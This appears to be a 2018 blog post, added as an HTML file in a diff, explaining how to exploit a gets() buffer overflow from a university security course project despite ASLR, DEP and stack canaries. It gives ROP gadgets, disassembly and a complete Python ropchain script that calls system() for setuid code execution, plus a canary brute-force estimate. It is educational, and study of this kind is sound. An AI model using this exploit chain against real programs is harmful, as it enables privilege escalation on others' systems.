@@ -1,0 +1,303 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>ropchain</title>
+        <link rel="stylesheet" href="../css/default.css" />
+        <link rel="stylesheet" href="../css/syntax.css" />
+          
+    </head>
+    <body>
+        <header>
+            <div class="logo">
+                <a href="../">Keyhan Vakil's blog</a>
+            </div>
+            <nav>
+                <a href="../">Home</a>
+                <a href="../about.html">About</a>
+            </nav>
+        </header>
+
+        <main role="main">
+            <article>
+    <section>
+        <h2>ropchain</h2>
+        <p><i>Tags:</i> <a title="All pages tagged 'security'." href="../tags/security.html" rel="tag">security</a>, <a title="All pages tagged 'low-level'." href="../tags/low-level.html" rel="tag">low-level</a></p>
+        <div role="main">
+<p>I’m going to show you how to do <a href="http://www-inst.eecs.berkeley.edu/~cs161/fa17/projects/project1-problems.pdf">Project 1 Question
+1</a>
+while ASLR+DEP+stack canaries are enabled. As a reminder, here’s how the
+code looks:</p>
+<pre><code>void deja_vu() {
+    char door[8];
+    gets(door);
+}
+
+int main() {
+    deja_vu();
+}</code></pre>
+<p><a href="https://bbs.pediy.com/thread-223798.htm">A Chinese translation of this article is available
+here.</a></p>
+<h1 id="aslr-and-dep">ASLR and DEP</h1>
+<p>We will start by defeating ASLR and DEP. The text segment of our dejavu
+binary will not be randomized, since it is not a position-independent
+executable. This means we can get around both defenses with a return
+oriented programming chain. Our solution is broken up into many
+different steps:</p>
+<ol type="1">
+<li>Put the address of the system function from libc onto the stack.</li>
+<li>Put the address of the string <code>"s/kernel/rtsig-max"</code> onto the stack
+(but possibly far from system).</li>
+<li>Align the stack pointer to point to <code>"s/kernel/rtsig-max"</code>.</li>
+<li>Align <code>edx</code> to point to &amp;system.</li>
+<li>Call <code>[edx]</code>.</li>
+</ol>
+<p>This is equivalent to <code>system("s/kernel/rtsig-max")</code>, which executes an
+attacker-controlled binary with setuid privileges. The string
+<code>"s/kernel/rtsig-max"</code> is mostly arbitrary, any string contained in libc
+which can be treated as a relative Linux path and ends whose address
+ends in a NUL byte is a valid target.</p>
+<p>It’s possible to get the string <code>"/bin/sh"</code> on the stack instead, but
+that makes our attack more complicated.</p>
+<h1 id="return-oriented-programming-primer">Return Oriented Programming Primer</h1>
+<p>The idea behind return oriented programming is that you place the
+addresses of “gadgets” onto the stack. These gadgets do some (usually
+small) operation, and then call <code>ret</code>. Once we <code>ret</code>, that pops the
+address of the next gadget off the stack and jumps to that address. Our
+goal is to chain these small gadgets together in order to achieve
+arbitrary code execution.</p>
+<p>Effectively, we can think of ROP as letting us jump to any series of
+addresses we want, as long as the calls doesn’t mess up our stack. Usual
+suspects for messing up the stack is a <code>leave</code> or anything which changes
+<code>esp</code> by a lot.</p>
+<p>There are tools to help find gadgets within executables. This is useful,
+because sometimes gadgets can even be hidden <em>inside</em> other
+instructions! Let’s run
+<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to see what
+sort of gadgets we have.</p>
+<pre><code>    $ python ROPgadget.py --binary ../dejavu --badbytes 0a
+    # ...
+    Unique gadgets found: 86</code></pre>
+<p>We set a “bad byte” of 0x0a since we know that our gets function cannot
+write a newline. (It can write NUL bytes.) While we have a bunch of
+gadgets, most of them <strong>suck</strong>. Here are the few that we plan to use:</p>
+<pre><code>    0x0804841c : dec ecx ; ret
+    0x0804835e : add dh, bl ; ret
+    0x0804857b : call dword ptr [edx]
+    0x080482d2 : pop ebx ; ret
+    0x080482bb : ret</code></pre>
+<p>Note that the last of these gadgets is effectively a return oriented
+programming NOP: it just moves the <code>esp</code> up 4 bytes to access the next
+return address. We’ll see later why it is useful.</p>
+<h1 id="the-attack">The Attack</h1>
+<p>We will need to reference the disassembly quite often. Here is the
+disassembly of the dejavu program, excluding libc parts.</p>
+<pre><code>    deja_vu:
+       0x0804840c &lt;+0&gt;:         push   ebp
+       0x0804840d &lt;+1&gt;:         mov    ebp,esp
+       0x0804840f &lt;+3&gt;:         sub    esp,0x28
+       0x08048412 &lt;+6&gt;:         lea    eax,[ebp-0x10]
+       0x08048415 &lt;+9&gt;:         mov    DWORD PTR [esp],eax
+       0x08048418 &lt;+12&gt;:        call   0x80482f0 &lt;gets@plt&gt;
+       0x0804841d &lt;+17&gt;:        leave  
+       0x0804841e &lt;+18&gt;:        ret   
+    main:
+       0x0804841f &lt;+0&gt;:         push   ebp
+       0x08048420 &lt;+1&gt;:         mov    ebp,esp
+       0x08048422 &lt;+3&gt;:         and    esp,0xfffffff0
+       0x08048425 &lt;+6&gt;:         call   0x804840c &lt;deja_vu&gt;
+       0x0804842a &lt;+11&gt;:        mov    eax,0x0
+       0x0804842f &lt;+16&gt;:        leave  
+       0x08048430 &lt;+17&gt;:        ret    </code></pre>
+<p>Let’s take a look at the stack layout at <code>deja_vu+18</code> (right before we
+<code>ret</code> from the function). It looks something like this:</p>
+<pre><code>    /---------------------\
+    |        . . .        |
+    |  saved return addr. |  &lt;--- esp
+    |        . . .        |
+    |        door         |  &lt;--- eax, edx
+    |        . . .        |
+    |        . . .        |
+    |        . . .        |
+    |      libc_end       |  &lt;--- ecx
+    |        . . .        |
+    |       system        |  &lt;--- we want this
+    |        . . .        |
+    |     libc_start      |  &lt;--- ebx
+    |        . . .        |
+    |        . . .        |
+    |        . . .        |
+    |    dejavu .text     |
+    \---------------------/</code></pre>
+<p>Even though libc’s position in code is randomized, <code>ebx</code> and <code>ecx</code>
+effectively “leak” information about its location. This is a result of
+the dynamic loader resolving the call to <code>gets@plt</code>. How this occurs is
+a little complicated, so let’s take it for granted.</p>
+<p>While the address of libc is randomized by ASLR, the offset of things
+within libc is not. For example, the system function is always at
+0x168494 bytes before <code>libc_end</code>. We want to call this function, so we
+need to decrease <code>ecx</code> by 0x168494.</p>
+<p>How can we decrease <code>ecx</code>? We do have a promising gadget which
+decrements <code>ecx</code> by 1:</p>
+<pre><code>    0x0804841c : dec ecx ; ret</code></pre>
+<p>We would need to call this gadget 0x168494 times to get the address of
+system. (There are no other useful gadgets for either <code>ecx</code> or <code>ebx</code>.)
+Our available stack space is an order of magnitude less.</p>
+<p>However, we can use the following trick: we return to main. Because gcc
+aligns the stack at 16 bytes intervals, we will gain stack space every
+time we call main. The picture below illustrates the scenario right
+before main+3 executes:</p>
+<pre><code>    /---------------------\
+    |        . . .        |
+    |       4 bytes       |  &lt;--- old esp
+    |         sfp         |  &lt;--- esp, ebp
+    |       4 bytes       |
+    |       4 bytes       |
+    |       4 bytes       |  &lt;--- esp &amp; 0xfffffff0
+    |        . . .        |
+    \---------------------/</code></pre>
+<p>After we call main, our program continues to call <code>deja_vu</code>. This gives
+us another opportunity to do a buffer overflow to gain more stack space.
+By repeating this method a bunch of times, we can get enough stack space
+to do 0x168494 decrements. We need to perform all the decrements at once
+since our value for <code>ecx</code> gets overwritten every time <code>gets</code> is called.</p>
+<p>We perform the same method in order to get the address of
+<code>"s/kernel/rtsig-max"</code> onto the stack.</p>
+<p>Once we have <code>ecx</code> pointing to system, we now need to call the address.
+There is a call gadget <code>call dword ptr [edx]</code>. So we need some way to
+get the address of the value of <code>ecx</code> into <code>edx</code>. The only place where
+we have the opportunity to put <code>ecx</code> on the stack is a <code>push ecx</code> in
+<code>_start</code>. The <code>_start</code> function is called by the operating system before
+main and effectively loads libc which then begins the main program.</p>
+<pre><code>    _start:
+       0x08048320 &lt;+0&gt;:     xor    ebp,ebp
+       0x08048322 &lt;+2&gt;:     pop    esi
+       0x08048323 &lt;+3&gt;:     mov    ecx,esp
+       0x08048325 &lt;+5&gt;:     and    esp,0xfffffff0
+       0x08048328 &lt;+8&gt;:     push   eax
+       0x08048329 &lt;+9&gt;:     push   esp
+       0x0804832a &lt;+10&gt;:  push   edx
+       0x0804832b &lt;+11&gt;:  push   0x80484b0
+       0x08048330 &lt;+16&gt;:  push   0x8048440
+       0x08048335 &lt;+21&gt;:  push   ecx
+       0x08048336 &lt;+22&gt;:  push   esi
+       0x08048337 &lt;+23&gt;:  push   0x804841f
+       0x0804833c &lt;+28&gt;:  call   0x8048310 &lt;__libc_start_main@plt&gt;
+       0x08048341 &lt;+33&gt;:  hlt    </code></pre>
+<p>In order to have the program run correctly and to push <code>ecx</code> on the
+stack, we need to jump to <code>_start+9</code>. We could actually jump to anywhere
+between <code>_start+5</code> and <code>_start+11</code>, but this will mess up our stack
+alignment later on.</p>
+<p>Recall that the return value of gets is stored in <code>edx</code>. We can use some
+arithmetic in order to get that <code>edx</code> to point one of the system calls.
+We do have a gadget which involves arithmetic using <code>edx</code> and <code>ebx</code>:</p>
+<pre><code>    0x0804835e : add dh, bl ; ret</code></pre>
+<p>If you need a reminder of how x86 registers work, look at the following
+diagram.</p>
+<pre><code>    /------------------------\
+    |          edx           |
+    |           |     dx     |
+    |           |  dh  |  dl |
+    \------------------------/</code></pre>
+<p>The register <code>edx</code> refers to the whole 32-bit register. The register
+<code>dx</code> refers to the lower 16-bits of the register. <code>dh</code> and <code>dl</code> refer to
+the two 8-bit halves of the lower 16-bits. So this gadget lets us change
+the middle bits of <code>edx</code> however we want. Note we can’t “overflow” <code>dh</code>
+into the top half of the register, so we cannot actually affect the top
+bits of <code>edx</code>.</p>
+<p>There is also a gadget letting us pop into <code>ebx</code>, so we completely
+control <code>bl</code>. We can load any value we want into <code>ebx</code> by putting it on
+the stack and then letting it get popped into the register. However this
+only lets us affect the second least significant byte of <code>edx</code>. Since
+<code>edx</code> is also the address of the <code>door</code> buffer, we can also change
+<code>door</code> and also <code>edx</code> by changing our stack pointer. Therefore we can
+use the same stack trick of returning to main in order to align <code>edx</code>
+with the address of system.</p>
+<p>Now we need to align our stack pointer with our executable string so
+that we can use it as an argument to system. We simply use a ROP NOP
+(similar to a ret2ret chain):</p>
+<pre><code>    0x080482bb : ret</code></pre>
+<p>After a few NOPs, we have that our stack pointer is nearly at the right
+spot. We finish our ROP chain with the previously mentioned
+<code>call dword ptr [edx]</code>. gets also terminates this with a NUL byte, which
+overwrites the LSB of the executable string address. (This is why we
+chose a string whose LSB was already 0x00.)</p>
+<p>Now we are in a ret2libc scenario: we are calling <code>system</code> with a
+pointer to a string on the stack. This runs the program as uid brown,
+which allows us to do whatever we want.</p>
+<h1 id="stack-canaries">Stack Canaries</h1>
+<p>Let’s say that we also add stack canaries. How much more difficult does
+this make our exploit?</p>
+<p>Debian systems always set the least significant byte of the canary to
+0x00, and so we only have 24 bits of entropy. We stay with the constant
+guess of 0x41414100 as the stack canary, and simply keep running until
+we get that. An efficient C program using syscalls can get on the order
+of 2500 tries per second. Based on this, we can estimate that our
+program will take approximately 1.2 hours to crack the canary.</p>
+<h1 id="closing-thoughts">Closing Thoughts</h1>
+<p>The final ropchain is listed in ropchain.py below. The code can be
+modified to create the necessary directories and executable
+automatically, and to work when stack canaries are enabled.</p>
+<div class="highlight">
+<pre><code>#!/usr/bin/env python2
+# ropchain.py
+from struct import pack
+
+p = lambda n: pack(&quot;&lt;I&quot;, n)
+sc = []
+
+PAD = 'A' * 20
+DEC_ECX = p(0x0804841c)
+RET_MAIN = p(0x0804841f)
+RET_START = p(0x08048320 + 9)
+POP_EBX = p(0x080482d2)
+ADD_DH_BL = p(0x0804835e)
+CALL_STAR_EDX = p(0x0804857b)
+ROP_NOP = p(0x080482bb)
+NEWLINE = '\n'
+
+GET_16B = PAD + RET_MAIN + NEWLINE
+
+OFFSET_BINARY = 0x450c4
+OFFSET_SYSTEM = 0x168494
+
+def load_libc_address(offset):
+    sc.extend([GET_16B] * ((offset + 3) / 4))
+    
+    sc.append(PAD)
+    sc.extend([DEC_ECX] * offset)
+    sc.append(RET_START)
+    sc.append(NEWLINE)
+
+load_libc_address(OFFSET_SYSTEM) 
+load_libc_address(OFFSET_BINARY) 
+
+sc.extend([GET_16B] * 3)
+
+sc.append(PAD + POP_EBX + p(1))
+sc.append(ADD_DH_BL)
+sc.extend([ROP_NOP] * 15)    
+sc.append(CALL_STAR_EDX)
+sc.append(NEWLINE)
+
+print(''.join(sc))</code></pre>
+</div>
+</div>
+    </section>
+    <section class="header">
+        
+        Posted on 2018-01-15
+    </section>
+</article>
+
+        </main>
+
+        <footer>
+            <a href="https://github.com/kvakil">Github</a> | Email: ken [at sign] kvakil.me
+        </footer>
+
+        <script type="text/javascript" src="../js/load-annotator.js"></script>
+    </body>
+</html>
